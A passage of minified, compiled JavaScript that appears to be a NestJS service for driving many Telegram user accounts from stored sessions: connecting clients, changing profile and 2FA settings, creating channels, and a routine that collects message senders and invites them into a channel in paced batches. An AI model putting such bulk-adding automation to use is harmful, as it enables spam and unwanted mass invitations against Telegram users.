,gBAAiBC,UAAU,IAG5C,SAAAC,OAAM,W,+HAWxB,IALL,IAAAhQ,KAAI,yBACJ,IAAAW,cAAa,CAAEC,QAAS,4BACxB,IAAAiP,UAAS,CAAE5L,KAAM,SAAU6L,YAAa,gBAAiBC,UAAU,IAG7C,SAAAC,OAAM,W,8HAUvB,IALL,IAAAhQ,KAAI,wBACJ,IAAAW,cAAa,CAAEC,QAAS,4BACxB,IAAAiP,UAAS,CAAE5L,KAAM,SAAU6L,YAAa,gBAAiBC,UAAU,IAGjD,SAAAC,OAAM,W,0HAUnB,IALL,IAAAhQ,KAAI,mCACJ,IAAAW,cAAa,CAAEC,QAAS,4BACxB,IAAAiP,UAAS,CAAE5L,KAAM,SAAU6L,YAAa,gBAAiBC,UAAU,IAG9C,SAAAC,OAAM,WAA2B,SAAAA,OAAM,W,oIAUvD,IALL,IAAAhQ,KAAI,mDACJ,IAAAW,cAAa,CAAEC,QAAS,4BACxB,IAAAiP,UAAS,CAAE5L,KAAM,SAAU6L,YAAa,gBAAiBC,UAAU,IAGvC,SAAAC,OAAM,WAA2B,SAAAA,OAAM,WAA2B,SAAAA,OAAM,Y,kJAS/F,IALL,IAAAhQ,KAAI,kCACJ,IAAAW,cAAa,CAAEC,QAAS,sBACxB,IAAAiP,UAAS,CAAE5L,KAAM,SAAU6L,YAAa,gBAAiBC,UAAU,IAGhD,SAAAC,OAAM,WAA2B,SAAAA,OAAM,Y,kIAWrD,IALL,IAAAhQ,KAAI,uBACJ,IAAAW,cAAa,CAAEC,QAAS,uBACxB,IAAAiP,UAAS,CAAE5L,KAAM,SAAU6L,YAAa,gBAAiBC,UAAU,IAGlD,SAAAC,OAAM,W,yHAUlB,IALL,IAAAhQ,KAAI,kBACJ,IAAAW,cAAa,CAAEC,QAAS,kBACxB,IAAAiP,UAAS,CAAE5L,KAAM,SAAU6L,YAAa,gBAAiBC,UAAU,IAGvD,SAAAC,OAAM,W,oHAUb,IALL,IAAAhQ,KAAI,qBACJ,IAAAW,cAAa,CAAEC,QAAS,kBACxB,IAAAiP,UAAS,CAAE5L,KAAM,SAAU6L,YAAa,gBAAiBC,UAAU,IAGpD,SAAAC,OAAM,W,uHAWhB,IANL,IAAAhQ,KAAI,wBACJ,IAAAW,cAAa,CAAEC,QAAS,sBACxB,IAAAiP,UAAS,CAAE5L,KAAM,SAAU6L,YAAa,gBAAiBC,UAAU,KACnE,IAAAE,UAAS,CAAEhM,KAAM,UAAW6L,YAAa,6BAA8BC,UAAU,IAG5D,SAAAC,OAAM,WAA2B,SAAAE,OAAM,Y,qIAUvD,IALL,IAAAlQ,KAAI,0BACJ,IAAAW,cAAa,CAAEC,QAAS,sBACxB,IAAAiP,UAAS,CAAE5L,KAAM,SAAU6L,YAAa,gBAAiBC,UAAU,IAG/C,SAAAC,OAAM,W,4HAWrB,IALL,IAAAhQ,KAAI,kBACJ,IAAAW,cAAa,CAAEC,QAAS,wBACxB,IAAAiP,UAAS,CAAE5L,KAAM,SAAU6L,YAAa,gBAAiBC,UAAU,IAGpD,SAAAC,OAAM,W,uHAUhB,IALL,IAAAhQ,KAAI,mBACJ,IAAAW,cAAa,CAAEC,QAAS,aACxB,IAAAiP,UAAS,CAAE5L,KAAM,SAAU6L,YAAa,gBAAiBC,UAAU,IAGtD,SAAAC,OAAM,W,qHASd,IAJL,IAAAhQ,KAAI,gCACJ,IAAAW,cAAa,CAAEC,QAAS,yBACxB,IAAAiP,UAAS,CAAE5L,KAAM,SAAU6L,YAAa,qBAAsB9O,KAAMmP,UACpE,IAAAN,UAAS,CAAE5L,KAAM,OAAQ6L,YAAa,eAAgB9O,KAAMmP,SAExD,SAAAH,OAAM,WACN,SAAAA,OAAM,S,mIASL,IAHL,IAAAhQ,KAAI,0BACJ,IAAAW,cAAa,CAAEC,QAAS,6BACxB,IAAAiP,UAAS,CAAE5L,KAAM,SAAU6L,YAAa,qBAAsB9O,KAAMmP,SAEhE,SAAAH,OAAM,W,4HAUL,IAJL,IAAAhQ,KAAI,2BACJ,IAAAW,cAAa,CAAEC,QAAS,qBACxB,IAAAiP,UAAS,CAAE5L,KAAM,SAAU6L,YAAa,qBAAsB9O,KAAMmP,UACpE,IAAAF,UAAS,CAAEhM,KAAM,WAAY6L,YAAa,eAAgB9O,KAAMmP,OAAQJ,UAAU,IAE9E,SAAAC,OAAM,WACN,SAAAE,OAAM,a,oIAUL,IAJL,IAAAlQ,KAAI,0BACJ,IAAAW,cAAa,CAAEC,QAAS,qBACxB,IAAAiP,UAAS,CAAE5L,KAAM,SAAU6L,YAAa,qBAAsB9O,KAAMmP,UACpE,IAAAF,UAAS,CAAEhM,KAAM,WAAY6L,YAAa,eAAgB9O,KAAMmP,SAE5D,SAAAH,OAAM,WACN,SAAAE,OAAM,a,mIAkCL,IA1BL,IAAAjQ,MAAK,eACL,IAAAU,cAAa,CAAEC,QAAS,2BACxB,IAAAE,SAAQ,CACLgP,YAAa,gEACb9O,KAAM,EAAAoP,iBAET,IAAAC,aAAY,CACTzL,OAAQ,IACRkL,YAAa,+BACb/O,OAAQ,CACJuP,QAAS,CACLC,SAAS,EACTC,cAAe,OAI1B,IAAAH,aAAY,CACTzL,OAAQ,IACRkL,YAAa,yBACb/O,OAAQ,CACJuP,QAAS,CACLC,SAAS,EACTjU,MAAO,oBAID,SAAAiN,S,iDAAsB,EAAA6G,gB,+DAiClC,IA1BL,IAAAnQ,MAAK,gBACL,IAAAU,cAAa,CAAEC,QAAS,2BACxB,IAAAE,SAAQ,CACLgP,YAAa,gEACb9O,KAAM,EAAAyP,kBAET,IAAAJ,aAAY,CACTzL,OAAQ,IACRkL,YAAa,+BACb/O,OAAQ,CACJuP,QAAS,CACLC,SAAS,EACTC,cAAe,OAI1B,IAAAH,aAAY,CACTzL,OAAQ,IACRkL,YAAa,yBACb/O,OAAQ,CACJuP,QAAS,CACLC,SAAS,EACTjU,MAAO,oBAIA,SAAAiN,S,iDAAuB,EAAAkH,iB,gEASpC,IAHL,IAAAzQ,KAAI,uBACJ,IAAAW,cAAa,CAAEC,QAAS,wBACxB,IAAAiP,UAAS,CAAE5L,KAAM,SAAU6L,YAAa,qBAAsB9O,KAAMmP,SAEhE,SAAAH,OAAM,W,yHAWL,IALL,IAAAhQ,KAAI,6BACJ,IAAAW,cAAa,CAAEC,QAAS,iBACxB,IAAAiP,UAAS,CAAE5L,KAAM,SAAU6L,YAAa,qBAAsB9O,KAAMmP,UACpE,IAAAF,UAAS,CAAEhM,KAAM,YAAa6L,YAAa,aAAc9O,KAAMmP,UAC/D,IAAAF,UAAS,CAAEhM,KAAM,QAAS6L,YAAa,QAAS9O,KAAMmP,SAElD,SAAAH,OAAM,WACN,SAAAE,OAAM,cACN,SAAAA,OAAM,U,uIAOL,IADL,IAAAlQ,KAAI,YACmB,SAAAkQ,OAAM,WAA2B,SAAAA,OAAM,WAA2B,SAAAA,OAAM,WAA2B,SAAAA,OAAM,U,oJAM3H,IADL,IAAAlQ,KAAI,YAEA,SAAAkQ,OAAM,WACN,SAAAA,OAAM,cACN,SAAAA,OAAM,WACN,SAAAQ,Q,qJAOC,IADL,IAAA1Q,KAAI,sBAEA,SAAAkQ,OAAM,WACN,SAAAA,OAAM,UACN,SAAAQ,Q,+IAiCC,IALL,IAAA1Q,KAAI,uCACJ,IAAAW,cAAa,CAAEC,QAAS,wBACxB,IAAAiP,UAAS,CAAE5L,KAAM,SAAU6L,YAAa,qBAAsB9O,KAAMmP,UACpE,IAAAN,UAAS,CAAE5L,KAAM,SAAU6L,YAAa,iBAAkB9O,KAAMmP,UAChE,IAAAN,UAAS,CAAE5L,KAAM,YAAa6L,YAAa,uBAAwB9O,KAAMmP,SAErE,SAAAH,OAAM,WACN,SAAAA,OAAM,WACN,SAAAA,OAAM,c,qIAUL,IAJL,IAAAhQ,KAAI,+BACJ,IAAAW,cAAa,CAAEC,QAAS,wBACxB,IAAAiP,UAAS,CAAE5L,KAAM,SAAU6L,YAAa,qBAAsB9O,KAAMmP,UACpE,IAAAN,UAAS,CAAE5L,KAAM,SAAU6L,YAAa,iBAAkB9O,KAAMmP,SAE5D,SAAAH,OAAM,WACN,SAAAA,OAAM,W,gIASL,IAHL,IAAAhQ,KAAI,8BACJ,IAAAW,cAAa,CAAEC,QAAS,wBACxB,IAAAiP,UAAS,CAAE5L,KAAM,SAAU6L,YAAa,qBAAsB9O,KAAMmP,SAEhE,SAAAH,OAAM,W,qJA3cFrE,EAAkB,IAF9B,IAAAvK,YAAW,aACX,IAAAoI,SAAQ,Y,uBAGiC,EAAAmH,mBAF7BhF,E,gcCTb,gBACA,UACA,UACA,UACA,UACA,UACA,UAYO,IAAM5J,EAAN,QAAM,EAAAA,eAAAA,E,iBAAAA,EAAc,IAV1B,IAAAH,QAAO,CACJC,QAAS,EACL,IAAA+O,aAAW,IAAM,EAAAzO,cACjB,EAAAC,oBACA,IAAAwO,aAAW,IAAM,EAAA5O,wBACjB,IAAA4O,aAAW,IAAM,EAAAtO,kBACrBW,YAAa,CAAC,EAAA0I,oBACdzI,UAAW,CAAC,EAAAyN,iBACZxN,QAAS,CAAC,EAAAwN,oBAED5O,E,s/CClBb,gBACA,UACA,UACA,aACA,UACA,UAEA,UACA,aACA,UAKO,IAAM4O,EAAe,EAArB,MAEH,WAAA5R,CAEY8R,EACAC,EAEAC,EAEAC,GALA,KAAAH,aAAAA,EACA,KAAAC,oBAAAA,EAEA,KAAAC,sBAAAA,EAEA,KAAAC,gBAAAA,CACT,CAEH,qBAAMjH,SACI1O,KAAK8Q,eACf,CAEO,oBAAA8E,GACH,OAAO,UAAgBA,sBAC3B,CAEO,oBAAAC,CAAqBjM,GACxB,UAAgBiM,qBAAqBjM,EACzC,CAEO,eAAMkM,CAAUC,GACnB,MAAMC,EAAS,EAAgBC,WAAW3J,IAAIyJ,GAC9C,IACI,GAAIC,GAAUA,EAAOE,YAEjB,aADMF,EAAO3U,UACN2U,CAEf,CAAE,MAAO/U,GACLH,QAAQC,IAAIE,EAChB,CAEJ,CAEO,SAAAkV,CAAUJ,GACb,OAAO,EAAgBE,WAAWG,IAAIL,EAC1C,CAEA,kBAAMlF,CAAakF,GACf,MAAMM,QAAYrW,KAAK8V,UAAUC,GAGjC,aAFMM,GAAKzF,cACX9P,QAAQC,IAAI,kBAAmBgV,GACxB,EAAgBE,WAAWK,OAAOP,EAC7C,CAEA,mBAAMjF,GACF,MAAMlH,EAAO,EAAgBqM,WAAWlK,UACxCjL,QAAQC,IAAI,6BACZ,IAAK,MAAOwV,EAAaP,KAAWpM,EAChC,UACUoM,GAAQpF,cACd,EAAgBqF,WAAWK,OAAOC,GAClCzV,QAAQC,IAAI,wBAAwBwV,IACxC,CAAE,MAAOtV,GACLH,QAAQC,KAAI,IAAAO,YAAWL,IACvBH,QAAQC,IAAI,0BAA0BwV,IAC1C,CAEJ,EAAgBN,WAAWO,QAE3BxW,KAAKyV,oBAAoBgB,0BAC7B,CAEA,kBAAM/F,CAAaD,EAAgBiG,GAAiB,EAAMC,GAAU,GAChE,MAAMzW,SAAcF,KAAKwV,aAAanT,OAAO,CAAEoO,YAAW,GAC1D,IAAKvQ,EACD,MAAM,IAAI,EAAA0W,oBAAoB,kBAElC,GAAK5W,KAAKmW,UAAU1F,GAiDhB,OADA3P,QAAQC,IAAI,+BACCf,KAAK8V,UAAUrF,GAjDH,CACzB,IACIuF,EADAa,EAAkB,IAAI,UAAgB3W,EAAK4W,QAAS5W,EAAKuQ,QAE7D,IAGI,GAFAuF,QAAea,EAAgBnG,aAAaiG,SACtCX,EAAO5D,QACT4D,EAqBA,OApBA,EAAgBC,WAAW9K,IAAIsF,EAAQoG,GACnCH,EACAK,YAAW9L,UACH+K,EAAOE,iBAAmBlW,KAAK8V,UAAUrF,IACzC3P,QAAQC,IAAI,yBAA0B0P,SAChCoG,EAAgBjG,cAEtB9P,QAAQC,IAAI,iCAAkC0P,GAElD,EAAgBwF,WAAWK,OAAO7F,EAAO,GAC1C,MAEHuG,aAAY/L,aAMT,KAEA4L,EAEP,MAAM,IAAI,EAAAD,oBAAoB,iBAEtC,CAAE,MAAO3V,GACLH,QAAQC,IAAI,iBACR8V,UACMA,EAAgBjG,aACtBiG,EAAkB,KAClB,EAAgBZ,WAAWK,OAAO7F,IAEtC,MAAMwG,GAAe,IAAA3V,YAAWL,GAOhC,MANI,IAAAiW,UAASD,EAAavS,QAAQyS,cAAe,CAAC,UAAW,eAAgB,cAAe,kBAAmB,0BAC3GrW,QAAQC,IAAI,kBAAmBb,EAAKuQ,cAC9BzQ,KAAKwV,aAAa4B,eAAe,CAAEC,IAAK,CAAC,CAAEC,KAAMpX,EAAKoX,MAAQ,CAAE7G,OAAQA,KAAa,CAAE8G,SAAS,KAEtGzW,QAAQC,IAAI,qBAEV,IAAI,EAAA6V,oBAAoBK,EAAavS,QAC/C,CACJ,CAIJ,CAEA,iBAAMqM,CAAYN,EAAgBO,EAAkBC,EAAgB,GAEhE,aAD6BjR,KAAK8V,UAAUrF,IACtBM,YAAYC,EAAUC,EAChD,CAGA,oBAAMC,CAAeT,EAAgBO,EAAkBI,EAAgBH,GAEnE,aAD6BjR,KAAK8V,UAAUrF,IACtBS,eAAeF,EAAUI,EAAQH,EAC3D,CAEA,uBAAMK,CAAkBb,EAAgBU,EAAgBzM,EAAiBqE,GAErE,aAD6B/I,KAAK8V,UAAUrF,IACtBa,kBAAkBH,EAAQzM,EAASqE,EAC7D,CAEA,eAAMsI,CAAUZ,EAAgBO,GAC5B,MAAMwG,QAAuBxX,KAAK8V,UAAUrF,GAC5C,aAAa+G,EAAeC,UAAUzG,EAC1C,CAEA,uBAAMQ,CAAkBf,GACpB,MAAM+G,QAAuBxX,KAAK8V,UAAUrF,GAC5C,aAAa+G,EAAehG,mBAChC,CAoCA,uBAAMkG,CAAkBjH,EAAgBkH,GACpC,MAAMH,QAAuBxX,KAAK8V,UAAUrF,GAC5C,UACU+G,EAAeI,YAAYD,EAAW3G,UAC5ClQ,QAAQC,IAAIyW,EAAejB,YAAa,+BAAgCoB,EAAW3G,UAC/E2G,EAAWE,oBASL7X,KAAK2V,gBAAgBmC,OAAOH,EAAWI,iBACvC/X,KAAK0V,sBAAsBoC,OAAOH,EAAWI,WACnDjX,QAAQC,IAAI,oBAAqB4W,EAAW3G,UAEpD,CAAE,MAAO/P,GAGL,MAFAH,QAAQC,IAAIyW,EAAejB,YAAa,uBAAwBoB,EAAW3G,UAC3EhR,KAAKgY,eAAe/W,EAAO0W,EAAWI,UAAWJ,EAAW3G,UACtD/P,CACV,CACJ,CAEA,oBAAM+W,CAAe/W,EAAY8W,EAAmB/G,GAChD,GAA0B,oBAAtB/P,EAAMuI,cAA4D,gBAAtBvI,EAAMuI,cAAwD,kBAAtBvI,EAAMuI,cAAoCvI,EAAM8B,WAAWkV,SAAS,eACxJ,IACI,GAAIF,QACM/X,KAAK2V,gBAAgBmC,OAAOC,SAC5B/X,KAAK0V,sBAAsBoC,OAAOC,GACxCjX,QAAQC,IAAI,oBAAqBgX,OAC9B,CACH,MAAMG,SAAwBlY,KAAK2V,gBAAgBtT,OAAO,CAAE2O,SAAUA,KAAa,SAC7EhR,KAAK2V,gBAAgBmC,OAAOI,EAAeH,iBAC3C/X,KAAK0V,sBAAsBoC,OAAOI,EAAeH,WACvDjX,QAAQC,IAAI,qBAAsBmX,EAAeH,UACrD,CACJ,CAAE,MAAOI,GACLrX,QAAQC,IAAI,oCAAqCoX,EACrD,KAC8B,oBAAvBlX,EAAMuI,qBACPxJ,KAAK2V,gBAAgB7H,OAAOiK,EAAW,CAAEK,SAAS,UAClDpY,KAAK0V,sBAAsB5H,OAAOiK,EAAW,CAAEK,SAAS,IAEtE,CAEA,mBAAMrF,CAActC,EAAgB4H,GAChC,IACI,MAAMb,QAAuBxX,KAAK8V,UAAUrF,GAC5C,aAAa+G,EAAezE,cAAcsF,EAC9C,CAAE,MAAOrX,GACLF,QAAQG,MAAM,gCAAiCD,EACnD,CACJ,CAEA,gBAAMgS,CAAWvC,EAAgB7G,EAA0CiB,GACvE,IACI,MAAM2M,QAAuBxX,KAAK8V,UAAUrF,GAC5C,aAAa+G,EAAexE,WAAWpJ,EAAMiB,EACjD,CAAE,MAAO7J,GACLF,QAAQG,MAAM,kCAAmCD,EACrD,CACJ,CAGA,iBAAMkS,CAAYzC,EAAgB2C,EAAwBvI,GACtD,IACI,MAAM2M,QAAuBxX,KAAK8V,UAAUrF,GAC5C,aAAa+G,EAAetE,YAAYE,EAAcvI,EAC1D,CAAE,MAAO7J,GACLF,QAAQG,MAAM,kCAAmCD,EACrD,CACJ,CAEA,sBAAM2Q,CAAiBlB,GACnB,MAAM+G,QAAuBxX,KAAK8V,UAAUrF,GAE5C,aADM+G,EAAe7F,mBACd,qCACX,CAGA,qBAAMC,CAAgBnB,GAClB,MAAM+G,QAAuBxX,KAAK8V,UAAUrF,GAC5C,aAAa+G,EAAec,iBAChC,CAEA,iBAAMzG,CAAYpB,GACd,MAAM+G,QAAuBxX,KAAK8V,UAAUrF,GAC5C,aAAa+G,EAAe3F,aAChC,CAEA,oBAAMC,CAAerB,EAAgB8H,GACjC,MAAMf,QAAuBxX,KAAK8V,UAAUrF,GAC5C,aAAa+G,EAAegB,sBAAsBD,EACtD,CAGA,2BAAMvG,CAAsBvB,EAAgB8H,EAAoBtG,GAC5D,MAAMuF,QAAuBxX,KAAK8V,UAAUrF,GAC5C,aAAa+G,EAAexF,sBAAsBuG,EAAYtG,EAClE,CAGA,gBAAME,CAAW1B,GACb,MAAM+G,QAAuBxX,KAAK8V,UAAUrF,GAC5C,aAAa+G,EAAerF,YAChC,CAEA,cAAMG,CAAS7B,GACX,MAAM+G,QAAuBxX,KAAK8V,UAAUrF,GAC5C,aAAa+G,EAAeiB,kBAChC,CAEA,oBAAMlG,CAAe9B,EAAgB+B,GAAmB,GACpD,MAAMgF,QAAuBxX,KAAK8V,UAAUrF,GAG5C,aAFqB+G,EAAekB,WAAW,CAAEzH,MAAO,GAAI0H,UAAU,UAEzDnB,EAAeoB,YAAYpG,EAC5C,CAEA,cAAME,CAASjC,GACX,MAAM+G,QAAuBxX,KAAK8V,UAAUrF,GAC5C,aAAa+G,EAAe9E,UAChC,CAEA,WAAMN,CAAM3B,GACR,MAAM+G,QAAuBxX,KAAK8V,UAAUrF,GAC5C,aAAa+G,EAAepF,OAChC,CAEA,sBAAMkB,CAAiB7C,GACnB,MAAM+G,QAAuBxX,KAAK8V,UAAUrF,GAC5C,aAAa+G,EAAelE,kBAChC,CAEA,YAAMX,CAAOlC,GACT,MAAM+G,QAAuBxX,KAAK8V,UAAUrF,GAC5C,IAGI,aAFM+G,EAAeqB,eACfrB,EAAe5G,aACd,sBACX,CAAE,MAAO3P,GACL,MAAMgW,GAAe,IAAA3V,YAAWL,GAChC,MAAM,IAAI,EAAA6X,cAAc7B,EAAavS,QAASqU,SAAS9B,EAAa1N,QACxE,CACJ,CAEA,oCAAMyP,CAA+BvI,GACjC,MAAM+G,QAAuBxX,KAAK8V,UAAUrF,SACtC+G,EAAewB,gCACzB,CAEA,yBAAMzE,CAAoB9D,GACtB,MAAM+G,QAAuBxX,KAAK8V,UAAUrF,SACtC+G,EAAejD,qBACzB,CAEA,mBAAM3B,CACFnC,EAAgB7H,GAEhB,MAAM4O,QAAuBxX,KAAK8V,UAAUrF,SACtC+G,EAAejD,sBACrB,UACU,EAAAvM,kBAAkB9G,YAAY0H,SAC9B,IAAAjH,OAAM,KACZ,MAAMqH,EAAW7I,QAAQ8I,MASzB,OARAnI,QAAQC,IAAI,gBAAiBiI,SACvBwO,EAAeyB,iBAAiBzU,EAAKR,KAAKgF,EAAU,kBACpD,IAAArH,OAAM,WACN6V,EAAeyB,iBAAiBzU,EAAKR,KAAKgF,EAAU,kBACpD,IAAArH,OAAM,WACN6V,EAAeyB,iBAAiBzU,EAAKR,KAAKgF,EAAU,kBACpD,IAAArH,OAAM,WACN6V,EAAe5G,aACd,8BACX,CAAE,MAAO3P,GACL,MAAMgW,GAAe,IAAA3V,YAAWL,GAChC,MAAM,IAAI,EAAA6X,cAAc7B,EAAavS,QAASqU,SAAS9B,EAAa1N,QACxE,CACJ,CAEA,mBAAMsJ,CACFpC,GAEA,MAAM+G,QAAuBxX,KAAK8V,UAAUrF,GAC5C,IAEI,aADM+G,EAAe3E,gBACd,8BACX,CAAE,MAAO5R,GACL,MAAMgW,GAAe,IAAA3V,YAAWL,GAChC,MAAM,IAAI,EAAA6X,cAAc7B,EAAavS,QAASqU,SAAS9B,EAAa1N,QACxE,CACJ,CAEA,wBAAMuK,CACFrD,EAAgBsD,GAEhB,MAAMyD,QAAuBxX,KAAK8V,UAAUrF,GAC5C,IACI,aAAa+G,EAAe1D,mBAAmBC,EACnD,CAAE,MAAO9S,GAEL,MADAH,QAAQC,IAAI,gBAAgB,IAAAO,YAAWL,GAAQA,GACzC,IAAIwI,MAAM,4BACpB,CACJ,CAEA,oBAAMqJ,CACFrC,EAAgBO,GAEhB,MAAMwG,QAAuBxX,KAAK8V,UAAUrF,GAC5C,IACI,aAAa+G,EAAe1E,eAAe9B,EAC/C,CAAE,MAAO/P,GAEL,MADAH,QAAQC,IAAI,gBAAgB,IAAAO,YAAWL,GAAQA,GACzC,IAAIwI,MAAM,4BACpB,CACJ,CAEA,sBAAMkK,CAAiBlD,EAAgBU,EAAgBC,EAAgBH,GACnE,MAAMuG,QAAuBxX,KAAK8V,UAAUrF,GAC5C,aAAa+G,EAAe7D,iBAAiBxC,EAAQC,EAAQH,EACjE,CAEA,uBAAM2C,CAAkBnD,EAAgBoD,EAAmB1C,EAAgB3F,GACvE,MAAMgM,QAAuBxX,KAAK8V,UAAUrF,GAC5C,aAAa+G,EAAe5D,kBAAkBC,EAAW1C,EAAQ3F,EACrE,CAEA,oBAAM4I,CAAe3D,EAAgBU,EAAgB0C,GACjD,MAAM2D,QAAuBxX,KAAK8V,UAAUrF,GAC5C,aAAa+G,EAAepD,eAAejD,EAAQ0C,EACvD,CAEA,mBAAMpB,CAAchC,GAChB,MAAM+G,QAAuBxX,KAAK8V,UAAUrF,GAEtCyI,SADoB1B,EAAeoB,aAAY,IACjBO,kBACpC,aAAa3B,EAAe/E,cAAcyG,EAC9C,CAGA,kBAAMhH,CAAazB,EAAgBwB,GAC/B,MAAMuF,QAAuBxX,KAAK8V,UAAUrF,GAC5C,aAAa+G,EAAe/E,cAAc,CAACR,GAC/C,CAGA,gBAAMoC,CAAW5D,EAAgBU,GAC7B,MAAMqG,QAAuBxX,KAAK8V,UAAUrF,GAC5C,aAAa+G,EAAenD,WAAWlD,EAC3C,CACA,sBAAMuC,CACFjD,EACA+C,EACAC,GAEA,MAAM+D,QAAuBxX,KAAK8V,UAAUrF,GAC5C,IAEI,aADM+G,EAAe4B,cAAc5F,EAAWC,GACvC,+BACX,CAAE,MAAOxS,GAEL,MADAH,QAAQC,IAAI,gBAAgB,IAAAO,YAAWL,GAAQA,GACzC,IAAIwI,MAAM,4BACpB,CACJ,GAjcS,EAAA6L,gBAAAA,EACM,EAAAW,WAA2C,IAAI/N,I,kBADrDoN,EAAe,MAD3B,IAAAvN,cAIQ,SAAAwH,SAAO,IAAAgG,aAAW,IAAM,EAAA8D,iBAGxB,SAAA9J,SAAO,IAAAgG,aAAW,IAAM,EAAA+D,0BAExB,SAAA/J,SAAO,IAAAgG,aAAW,IAAM,EAAAgE,oB,uBAJH,EAAAF,aACO,EAAAG,oBAEE,EAAAF,sBAEN,EAAAC,mBATpBjE,E,o7BCdb,gBACA,SACA,UACA,UACA,aACA,aACA,UACA,UACA,UAEA,UACA,UACA,aAIA,MAAMmE,EAMF,WAAA/V,CAAYgW,EAAuBnD,GAC/BvW,KAAK8W,QAAU,IAAI,EAAA6C,cAAcD,GACjC1Z,KAAKuW,YAAcA,EACnBvW,KAAKgW,OAAS,KACdhW,KAAK4Z,aAAe,EACxB,CAEO,2BAAOhE,GACV,OAAO6D,EAAgBI,iBAC3B,CAEO,2BAAOhE,CAAqBjM,GAC/B6P,EAAgBI,kBAAoBjQ,CACxC,CAEO,iBAAMiI,GACT,MACMiI,EAAmB9Z,KAAKuW,YACxBxW,QAAoBC,KAAKgW,OAAO+D,OAClC,IAAI,EAAAC,IAAItI,SAASuI,cAAc,CAC3BC,MAJU,iBAKVzG,MAAOqG,EACPK,WAAW,EACXC,WAAW,MAGb,GAAEC,EAAE,WAAEC,GAAeva,EAAOwa,MAAM,GA6BxC,aAzBMva,KAAKgW,OAAO+D,OACd,IAAI,EAAAC,IAAIQ,QAAQC,gBAAgB,CAC5BC,YAAa,CACT,IAAI,EAAAV,IAAIW,gBAAgB,CACpBC,KAAM,IAAI,EAAAZ,IAAIa,iBAAiB,CAC3B9C,UAAWsC,EACXC,WAAYA,IAEhBQ,SATC,cAiBY9a,KAAKgW,OAAO+D,OACrC,IAAI,EAAAC,IAAItI,SAASqJ,gBAAgB,CAC7B9I,QAAS,IAAI,EAAA+H,IAAIgB,aAAa,CAC1BjD,UAAWsC,EACXC,WAAYA,IAEhBW,MAPW,CAAC,mBAUb,CAAEZ,KAAIC,aACjB,CAEO,2BAAM9B,CAAsBD,GAC/B,MAAM,GAAE8B,EAAE,WAAEC,SAAqBta,KAAK6R,oBAChC7R,KAAKkb,kBAAkB3C,EAAY8B,EAAGtX,WAChD,CAEO,2BAAMiP,CAAsBuG,EAAoBtG,GACnD,MAAMlS,QAAoBC,KAAK4X,YAAY3F,SAErCjS,KAAKgW,OAAO+D,OACd,IAAI,EAAAC,IAAIQ,QAAQC,gBAAgB,CAC5BC,YAAa,CACT,IAAI,EAAAV,IAAIW,gBAAgB,CACpBC,KAAM,IAAI,EAAAZ,IAAIa,iBAAiB,CAC3B9C,UAAWhY,EAAOwa,MAAM,GAAGF,GAC3BC,WAAYva,EAAOwa,MAAM,GAAGD,aAEhCQ,SATC,cAeX9a,KAAKkb,kBAAkB3C,EAAYtG,EAC7C,CAEO,uBAAMiJ,CAAkB3C,EAAoB4C,GAC/C,IAAI/J,EAAS,EAETgK,EAAgB,EAChBC,EAAiB,EACjBC,EAAgB,GACpB,EAAG,CACCA,QAAiBtb,KAAKgW,OAAOjF,YAAYwH,EAAY,CAAEgD,SAAUnK,EAAQH,MALjE,MAMRmK,EAAgBE,EAASE,MACzB,MAAMC,EAAaH,EAAStQ,KAAKtG,IAE7B,GADA0M,EAAS1M,EAAQ2V,GACb3V,EAAQ2V,IAAM3V,EAAQgX,MACtB,OAAOhX,EAAQ2V,EAEH,IACjBsB,QAAOtB,QAAauB,IAAPvB,IAEhB,GADAvZ,QAAQC,IAAI0a,GACRA,EAAWnZ,OAAS,EAAG,CACvB,UACyBtC,KAAKgW,OAAO6F,gBAAgBV,EAAU,CACvDG,SAAUG,EACVK,SAAUvD,IAGd8C,GAAkBI,EAAWnZ,OAC7BxB,QAAQC,IAAI,aAAasa,OAAoBD,oBACvC,IAAAzZ,OAAM,IAChB,CAAE,MAAOV,GACLH,QAAQG,MAAM,4CAA6CA,EAC/D,OACM,IAAAU,OAAM,IAChB,CACJ,OAAS2Z,EAAShZ,OAAS,SAErBtC,KAAKyS,cAAc,CAAC0I,GAE9B,CAGA,qBAAMU,CAAgBtD,EAAoB4C,EAAkBM,GACxD,MACML,EAAgBK,EAAWnZ,OACjC,IAAI+Y,EAAiB,EAErB,IAAK,IAAIU,EAAI,EAAGA,EAAIX,EAAeW,GAJjB,GAIiC,CAC/C,MAAMjZ,EAAQ2Y,EAAWO,MAAMD,EAAGA,EALpB,IAMd,UACyB/b,KAAKgW,OAAO6F,gBAAgBV,EAAU,CACvDG,SAAUxY,EACVgZ,SAAUvD,IAGd8C,GAAkBvY,EAAMR,OACxBxB,QAAQC,IAAI,aAAasa,OAAoBD,oBACvC,IAAAzZ,OAAM,IAChB,CAAE,MAAOV,GACLH,QAAQG,MAAM,4CAA6CA,EAC/D,CACJ,CAEA,OAAOoa,CACX,CAEA,gBAAMzK,GACE5Q,KAAKgW,SACLlV,QAAQC,IAAI,sBAAuBf,KAAKuW,aAExCvW,KAAKgW,OAAOiG,YAAa,QACnBjc,KAAKgW,OAAOpF,aAClB5Q,KAAKgW,OAAS,MAElBhW,KAAK8W,QAAQR,QACjB,CAEA,eAAMmB,CAAUzG,GACZ,IAAKhR,KAAKgW,OAAQ,MAAM,IAAIvM,MAAM,6BAElC,aADqBzJ,KAAKgW,OAAOkG,eAAelL,EAEpD,CAEA,WAAMoB,GAEF,aAD2BpS,KAAKgW,OAAO5D,OAE3C,CAEA,kBAAM+J,CAAalb,IACf,IAAAK,YAAWL,GACPA,EAAMyD,SAA4B,WAAjBzD,EAAMyD,SAMvB5D,QAAQG,MAAM,6BAA6BjB,KAAKuW,eAAgBtV,EAGxE,CAEA,kBAAMyP,CAAaiG,GAAU,EAAMyF,GAC/Bpc,KAAKgW,OAAS,IAAI,EAAAqG,eAAerc,KAAK8W,QAASiC,SAAS5Y,QAAQC,IAAIkc,QAASnc,QAAQC,IAAImc,SAAU,CAC/FC,kBAAmB,IAEvBxc,KAAKgW,OAAOyG,YAAY,EAAAC,SAASC,OACjC3c,KAAKgW,OAAO4G,cAAgB5c,KAAKmc,mBAC3Bnc,KAAKgW,OAAO3U,UAClB,MAAMwb,QAAqB7c,KAAKgW,OAAO5D,QAUvC,OATAtR,QAAQC,IAAI,sBAAuB8b,EAAGC,OAClCnG,GAAW3W,KAAKgW,SAChBlV,QAAQC,IAAI,wBACRqb,EACApc,KAAKgW,OAAO+G,iBAAgB9R,MAAO+R,UAAkBZ,EAAUY,EAAM,GAAK,IAAI,EAAAC,YAE9Ejd,KAAKgW,OAAO+G,iBAAgB9R,MAAO+R,UAAkBhd